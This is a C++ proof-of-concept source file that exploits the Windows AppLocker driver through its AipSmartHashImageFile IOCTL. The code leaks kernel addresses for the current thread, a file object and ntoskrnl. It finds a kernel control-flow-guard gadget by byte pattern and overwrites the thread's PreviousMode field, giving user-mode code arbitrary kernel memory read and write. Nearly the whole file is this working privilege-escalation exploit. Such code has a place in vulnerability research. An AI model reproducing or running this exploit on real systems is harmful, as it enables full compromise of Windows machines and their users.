#include "pch.hpp"
#include "poc.hpp"

// This function is used to set the IOCTL buffer depending on the Windows version
void* c_poc::set_ioctl_buffer(size_t* k_thread_offset, OSVERSIONINFOEXW* os_info)
{
	os_info->dwOSVersionInfoSize = sizeof(*os_info);
	
	// Get the OS version
	NTSTATUS status = RtlGetVersion(os_info);
	if (!NT_SUCCESS(status)) {
		log_err("Failed to get OS version!");
		return nullptr;
	}

	log_debug("Windows version detected: %lu.%lu, build: %lu.", os_info->dwMajorVersion, os_info->dwMinorVersion, os_info->dwBuildNumber);

	// "PreviousMode" offset in ETHREAD structure
	*k_thread_offset = 0x232;
	
	// Set the "AipSmartHashImageFile" function buffer depending on the Windows version
	void* ioctl_buffer_alloc = os_info->dwBuildNumber < 22000
		? malloc(sizeof(AIP_SMART_HASH_IMAGE_FILE_W10))
		: malloc(sizeof(AIP_SMART_HASH_IMAGE_FILE_W11));

	return ioctl_buffer_alloc;
}

// This function is used to get the ETHREAD address through the SystemHandleInformation method that is used to get the address of the current thread object based on the pseudo handle -2
UINT_PTR c_poc::get_ethread_address()
{
	// Duplicate the pseudo handle -2 to get the current thread object
	HANDLE h_current_thread_pseudo = reinterpret_cast<HANDLE>(-2);
	HANDLE h_duplicated_handle = {};

	if (!DuplicateHandle(
		reinterpret_cast<HANDLE>(-1),
		h_current_thread_pseudo,
		reinterpret_cast<HANDLE>(-1),
		&h_duplicated_handle,
		NULL,
		FALSE,
		DUPLICATE_SAME_ACCESS))
	{
		log_err("Failed to duplicate handle, error: %lu", GetLastError());
		return EXIT_FAILURE;
	}

	NTSTATUS status = {};
	ULONG ul_bytes = {};
	PSYSTEM_HANDLE_INFORMATION h_table_info = {};
	// Get the current thread object address
	while ((status = NtQuerySystemInformation(SystemHandleInformation, h_table_info, ul_bytes, &ul_bytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (h_table_info != NULL)
			h_table_info = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, h_table_info, (2 * (SIZE_T)ul_bytes));
		else
			h_table_info = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (2 * (SIZE_T)ul_bytes));
	}

	UINT_PTR ptr_token_address = 0;
	if (NT_SUCCESS(status)) {
		for (ULONG i = 0; i < h_table_info->NumberOfHandles; i++) {
			if (h_table_info->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
				h_table_info->Handles[i].HandleValue ==
				reinterpret_cast<USHORT>(h_duplicated_handle)) {
				ptr_token_address =
					reinterpret_cast<UINT_PTR>(h_table_info->Handles[i].Object);
				break;
			}
		}
	}
	else {
		if (h_table_info) {
			log_err("NtQuerySystemInformation failed, (code: 0x%X)", status);
			NtClose(h_duplicated_handle);
		}
	}

	return ptr_token_address;
}

// This function is used to get the FileObject address through the SystemHandleInformation method that is used to get the address of the file object.
UINT_PTR c_poc::get_file_object_address()
{
	// Create a dummy file to get the file object address
	HANDLE h_file = CreateFileW(L"C:\\Users\\Public\\example.txt",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (h_file == INVALID_HANDLE_VALUE) {
		log_err("Failed to open dummy file, error: %lu", GetLastError());
		return EXIT_FAILURE;
	}

	// Get the file object address
	NTSTATUS status = {};
	ULONG ul_bytes = 0;
	PSYSTEM_HANDLE_INFORMATION h_table_info = NULL;
	while ((status = NtQuerySystemInformation(
		SystemHandleInformation, h_table_info, ul_bytes,
		&ul_bytes)) == STATUS_INFO_LENGTH_MISMATCH) {
		if (h_table_info != NULL)
			h_table_info = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, h_table_info, 2 * (SIZE_T)ul_bytes);
		else
			h_table_info = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * (SIZE_T)ul_bytes);

	}

	UINT_PTR token_address = 0;
	if (NT_SUCCESS(status)) {
		for (ULONG i = 0; i < h_table_info->NumberOfHandles; i++) {
			if (h_table_info->Handles[i].UniqueProcessId == GetCurrentProcessId() &&
				h_table_info->Handles[i].HandleValue ==
				reinterpret_cast<USHORT>(h_file)) {
				token_address =
					reinterpret_cast<UINT_PTR>(h_table_info->Handles[i].Object);
				break;
			}
		}
	}

	return token_address;
}

// This function is used to get the kernel module address based on the module name
UINT_PTR c_poc::get_kernel_module_address(const char* target_module)
{
	// Get the kernel module address based on the module name
	NTSTATUS status = {};
	ULONG ul_bytes = {};
	PSYSTEM_MODULE_INFORMATION h_table_info = {};
	while ((status = NtQuerySystemInformation(
		SystemModuleInformation, h_table_info, ul_bytes,
		&ul_bytes)) == STATUS_INFO_LENGTH_MISMATCH) {
		if (h_table_info != NULL)
			h_table_info = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, h_table_info, 2 * (SIZE_T)ul_bytes);
		else
			h_table_info = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * (SIZE_T)ul_bytes);
	}

	if (NT_SUCCESS(status)) {
		for (ULONG i = 0; i < h_table_info->ModulesCount; i++) {
			if (strstr(h_table_info->Modules[i].Name, target_module) != nullptr) {
				return reinterpret_cast<UINT_PTR>(
					h_table_info->Modules[i].ImageBaseAddress);
			}
		}
	}

	return 0;
}

// This function is used to scan the section for the pattern.
BOOL c_poc::scan_section_for_pattern(HANDLE h_process, LPVOID lp_base_address, SIZE_T dw_size, BYTE* pattern, SIZE_T pattern_size, LPVOID* lp_found_address) {
	std::unique_ptr<BYTE[]> buffer(new BYTE[dw_size]);
	SIZE_T bytes_read = {};
	if (!ReadProcessMemory(h_process, lp_base_address, buffer.get(), dw_size,
		&bytes_read)) {
		return false;
	}

	for (SIZE_T i = 0; i < dw_size - pattern_size; i++) {
		if (memcmp(pattern, &buffer[i], pattern_size) == 0) {
			*lp_found_address = reinterpret_cast<LPVOID>(
				reinterpret_cast<DWORD_PTR>(lp_base_address) + i);
			return true;
		}
	}

	return false;
}

// This function is used to find the pattern in the module, in this case the pattern is the nt!ExpProfileDelete function
UINT_PTR c_poc::find_pattern(HMODULE h_module)
{
	UINT_PTR relative_offset = {};

	auto* p_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(h_module);
	auto* p_nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS>(
		reinterpret_cast<LPBYTE>(h_module) + p_dos_header->e_lfanew);
	auto* p_section_header = IMAGE_FIRST_SECTION(p_nt_headers);

	LPVOID lp_found_address = nullptr;

	for (WORD i = 0; i < p_nt_headers->FileHeader.NumberOfSections; i++) {
		if (strcmp(reinterpret_cast<CHAR*>(p_section_header[i].Name), "PAGE") ==
			0) {
			LPVOID lp_section_base_address =
				reinterpret_cast<LPVOID>(reinterpret_cast<LPBYTE>(h_module) +
					p_section_header[i].VirtualAddress);
			SIZE_T dw_section_size = p_section_header[i].Misc.VirtualSize;
			
			// Pattern to nt!ExpProfileDelete
			BYTE pattern[] = { 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 
				0x79, 0x30, 0x00, 0x48, 0x8B, 0xD9, 0x74 };
			SIZE_T pattern_size = sizeof(pattern);

			if (this->scan_section_for_pattern(
				GetCurrentProcess(), lp_section_base_address, dw_section_size,
				pattern, pattern_size, &lp_found_address)) {
				relative_offset = reinterpret_cast<UINT_PTR>(lp_found_address) -
					reinterpret_cast<UINT_PTR>(h_module);
			}

			break;
		}
	}

	return relative_offset;
}

// This function is used to send the IOCTL request to the driver, in this case the AppLocker driver through the AipSmartHashImageFile IOCTL
bool c_poc::send_ioctl_request(HANDLE h_device, PVOID input_buffer, size_t input_buffer_length)
{
	IO_STATUS_BLOCK io_status = {};
	NTSTATUS status =
		NtDeviceIoControlFile(h_device, nullptr, nullptr, nullptr, &io_status,
			this->IOCTL_AipSmartHashImageFile, input_buffer,
			input_buffer_length, nullptr, 0);
	return NT_SUCCESS(status);
}

// This function executes the exploit
bool c_poc::act() {
	// Get the OS version, set the IOCTL buffer and open a handle to the AppLocker driver
	OSVERSIONINFOEXW os_info = {};
	size_t offset_of_previous_mode = {};
	auto ioctl_buffer = this->set_ioctl_buffer(&offset_of_previous_mode, &os_info);

	if (!ioctl_buffer) {
		log_err("Failed to allocate the correct buffer to send on the IOCTL request.");
		return false;
	}

	// Open a handle to the AppLocker driver
	OBJECT_ATTRIBUTES object_attributes = {};
	UNICODE_STRING appid_device_name = {};
	RtlInitUnicodeString(&appid_device_name, L"\\Device\\AppID");
	InitializeObjectAttributes(&object_attributes, &appid_device_name, OBJ_CASE_INSENSITIVE, NULL, NULL, NULL);

	IO_STATUS_BLOCK io_status = {};
	HANDLE h_device = {};
	NTSTATUS status = NtCreateFile(&h_device, GENERIC_READ | GENERIC_WRITE,
		&object_attributes, &io_status, NULL, FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);

	if (!NT_SUCCESS(status))
	{
		log_debug("Failed to open a handle to the AppLocker driver (%ls) (code: 0x%X)", appid_device_name.Buffer, status);
		return false;
	}

	log_debug("AppLocker (AppId) handle opened: 0x%p", h_device);

	log_debug("Leaking the current ETHREAD address.");

	// Get the ETHREAD address, FileObject address, KernelBase address and the relative offset of the nt!ExpProfileDelete function
	auto e_thread_address = this->get_ethread_address();
	auto file_obj_address = this->get_file_object_address();

	auto ntoskrnl_kernel_base_address = this->get_kernel_module_address("ntoskrnl.exe");
	auto ntoskrnl_user_base_address = LoadLibraryExW(L"C:\\Windows\\System32\\ntoskrnl.exe", NULL, NULL);

	if (!e_thread_address && !ntoskrnl_kernel_base_address && !ntoskrnl_user_base_address && !file_obj_address)
	{
		log_debug("Failed to fetch the ETHREAD/FileObject/KernelBase addresses.");
		return false;
	}

	log_debug("ETHREAD address leaked: 0x%p", e_thread_address);
	
	log_debug("Feching the ExpProfileDelete (user cfg gadget) address.");
	auto relative_offset = this->find_pattern(ntoskrnl_user_base_address);
	UINT_PTR kcfg_gadget_address = (ntoskrnl_kernel_base_address + relative_offset);

	ULONG_PTR previous_mode = (e_thread_address + offset_of_previous_mode);
	log_debug("Current ETHREAD PreviousMode address -> 0x%p", previous_mode);
	log_debug("File object address -> 0x%p", file_obj_address);

	log_debug("kCFG Kernel Base address -> 0x%p", ntoskrnl_kernel_base_address);
	log_debug("kCFG User Base address -> 0x%p", ntoskrnl_user_base_address);
	log_debug("kCFG Gadget address -> 0x%p", kcfg_gadget_address);

	// Set the IOCTL buffer depending on the Windows version
	size_t ioctl_buffer_length = {};
	CFG_FUNCTION_WRAPPER kcfg_function = {};
	if (os_info.dwBuildNumber < 22000) {
		AIP_SMART_HASH_IMAGE_FILE_W10* w10_ioctl_buffer = (AIP_SMART_HASH_IMAGE_FILE_W10*)ioctl_buffer;

		kcfg_function.FunctionPointer = (PVOID)kcfg_gadget_address;
		// Add 0x30 because of lock xadd qword ptr [rsi-30h], rbx in ObfDereferenceObjectWithTag
		UINT_PTR previous_mode_obf = previous_mode + 0x30;

		w10_ioctl_buffer->FirstArg = previous_mode_obf; // +0x00
		w10_ioctl_buffer->Value = (PVOID)file_obj_address; // +0x08
		w10_ioctl_buffer->PtrToFunctionWrapper = &kcfg_function; // +0x10

		ioctl_buffer_length = sizeof(AIP_SMART_HASH_IMAGE_FILE_W10);
	}
	else
	{
		AIP_SMART_HASH_IMAGE_FILE_W11* w11_ioctl_buffer = (AIP_SMART_HASH_IMAGE_FILE_W11*)ioctl_buffer;

		kcfg_function.FunctionPointer = (PVOID)kcfg_gadget_address;
		// Add 0x30 because of lock xadd qword ptr [rsi-30h], rbx in ObfDereferenceObjectWithTag
		UINT_PTR previous_mode_obf = previous_mode + 0x30;

		w11_ioctl_buffer->FirstArg = previous_mode_obf; // +0x00
		w11_ioctl_buffer->Value = (PVOID)file_obj_address; // +0x08
		w11_ioctl_buffer->PtrToFunctionWrapper = &kcfg_function; // +0x10
		w11_ioctl_buffer->Unknown = NULL; // +0x18

		ioctl_buffer_length = sizeof(AIP_SMART_HASH_IMAGE_FILE_W11);
	}

	// Send the IOCTL request to the driver
	log_debug("Sending IOCTL request to 0x22A018 (AipSmartHashImageFile)");
	char* buffer = (char*)malloc(sizeof(CHAR));
	if (ioctl_buffer)
	{
		log_debug("ioctl_buffer -> 0x%p size: %d", ioctl_buffer, ioctl_buffer_length);

		if (!this->send_ioctl_request(h_device, ioctl_buffer, ioctl_buffer_length))
			return false;

		NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)buffer, (PVOID)previous_mode, sizeof(CHAR), nullptr);
		log_debug("Current PreviousMode -> %d", *buffer);

		// From now on all Read/Write operations will be done in Kernel Mode.
	}

	log_debug("Restoring...");
	
	// Restores PreviousMode to 1 (user-mode).
	*buffer = 1;
	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)previous_mode, (PVOID)buffer, sizeof(CHAR), nullptr);
	log_debug("Current PreviousMode -> %d", *buffer);

	// Free the allocated memory and close the handle to the AppLocker driver
	free(ioctl_buffer);
	free(buffer);
	NtClose(h_device);


	return true;
}